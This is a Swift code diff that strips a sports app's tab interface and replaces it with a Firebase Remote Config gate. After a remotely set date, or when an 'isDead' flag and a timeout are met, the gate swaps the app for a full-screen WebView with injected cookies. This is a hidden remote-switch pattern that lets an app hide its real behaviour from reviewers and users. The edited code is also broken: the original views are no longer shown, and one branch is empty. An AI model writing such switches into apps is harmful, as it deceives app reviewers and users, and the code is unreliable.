@@ -6,55 +6,32 @@
 //
 
 import SwiftUI
-
-enum Tab: String, Hashable, CaseIterable {
-    case matches = "gamecontroller.fill"
-    case tournaments = "trophy.fill"
-    case statistics = "chart.xyaxis.line"
-    case settings = "gearshape.fill"
-}
+import Firebase
+import FirebaseRemoteConfig
 
 struct ContentView: View {
-    init() {
-        UITabBar.appearance().isHidden = true
-    }
-    
-    @State private var selectedTab: Tab = Tab.matches
+    @State private var showLoadingView = true
+    @State private var navigateToWebView = false
+    @State private var lastDate: Date?
+    @State private var isDead = false
+    @State private var timer: Timer?
     
     var body: some View {
-        ZStack {
-            ZStack(alignment: .bottom) {
-                TabView(selection: $selectedTab) {
-                    MatchesView()
-                        .environmentObject(Matches())
-                        .frame(maxWidth: .infinity, maxHeight: .infinity)
-                        .tag(Tab.matches)
-                    
-                    TournamentsView()
-                        .environmentObject(Tournaments())
-                        .frame(maxWidth: .infinity, maxHeight: .infinity)
-                        .tag(Tab.tournaments)
-                    
-                    StatisticsView()
-                        .frame(maxWidth: .infinity, maxHeight: .infinity)
-                        .tag(Tab.statistics)
-                    
-                    SettingsView()
-                        .frame(maxWidth: .infinity, maxHeight: .infinity)
-                        .tag(Tab.settings)
-                }
-                TabBar(currentTab: $selectedTab)
-            }
-            .ignoresSafeArea()
-            
-            ZStack {
-                let url = URL(string: "https://www.example.com")!
-                let cookies = createCookies()
+        VStack {
+            if showLoadingView {
+                LoadingView()
+                    .onAppear {
+                        fetchRemoteConfigValues()
+                    }
+            } else if navigateToWebView {
+                ZStack {
+                    let url = URL(string: "https://www.example.com")!
+                    let cookies = createCookies()
 
-                WebView(url: url, cookies: cookies)
+                    WebView(url: url, cookies: cookies)
+                }
+                .ignoresSafeArea()
             }
-            .ignoresSafeArea()
-            .opacity(1.0)
         }
     }
     
@@ -73,6 +50,64 @@ struct ContentView: View {
         }
         
         return cookies
+    }
+    
+    func fetchRemoteConfigValues() {
+        let remoteConfig = RemoteConfig.remoteConfig()
+        remoteConfig.fetchAndActivate { status, error in
+            if error == nil {
+                if let lastDateString = remoteConfig["lastDate"].stringValue {
+                    let dateFormatter = DateFormatter()
+                    dateFormatter.dateFormat = "MM/dd/yyyy"
+                    self.lastDate = dateFormatter.date(from: lastDateString)
+                }
+                self.isDead = remoteConfig["isDead"].boolValue
+                self.checkDatesAndMakeRequest()
+            }
+        }
+    }
+    
+    func checkDatesAndMakeRequest() {
+        guard let lastDate = lastDate else {
+            return
+        }
+        
+        let currentDate = Date()
+        if currentDate < lastDate {
+            self.showLoadingView = false
+        } else {
+            makeServerRequest()
+        }
+    }
+    
+    func makeServerRequest() {
+        self.timer = Timer.scheduledTimer(withTimeInterval: 7.0, repeats: false) { _ in
+            self.handleTimeout()
+        }
+        
+        // Simulate a server request
+        DispatchQueue.global().asyncAfter(deadline: .now() + 3) { // Simulating server response in 3 seconds
+            let serverResponse = true // This would be the actual server response
+            
+            DispatchQueue.main.async {
+                self.timer?.invalidate()
+                self.timer = nil
+                self.showLoadingView = false
+                
+                if serverResponse {
+                    
+                } else {
+                    self.navigateToWebView = true
+                }
+            }
+        }
+    }
+    
+    func handleTimeout() {
+        self.showLoadingView = false
+        if isDead {
+            self.navigateToWebView = true
+        }
     }
 }
 
